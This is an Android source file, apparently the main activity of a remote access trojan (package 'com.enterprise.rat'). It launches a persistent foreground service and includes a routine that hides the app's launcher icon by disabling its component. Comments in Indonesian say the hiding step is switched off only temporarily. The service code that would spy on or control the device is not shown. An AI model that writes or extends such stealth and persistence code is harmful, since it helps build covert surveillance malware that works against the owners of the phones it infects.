package com.enterprise.rat;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import com.enterprise.rat.services.MainService;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");
        setContentView(R.layout.activity_main);
        startMainService();
        // hideAppIcon(); // dinonaktifkan sementara agar activity bisa dibuka ulang
        // finish();      // jangan langsung tutup, biarkan dulu
    }

    private void startMainService() {
        Intent intent = new Intent(this, MainService.class);
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d("MainActivity", "Service started");
        } catch (Exception e) {
            Log.e("MainActivity", "start error", e);
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName mainComponent = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d("MainActivity", "Icon hidden");
        } catch (Exception e) {
            Log.e("MainActivity", "hide error", e);
        }
    }
}
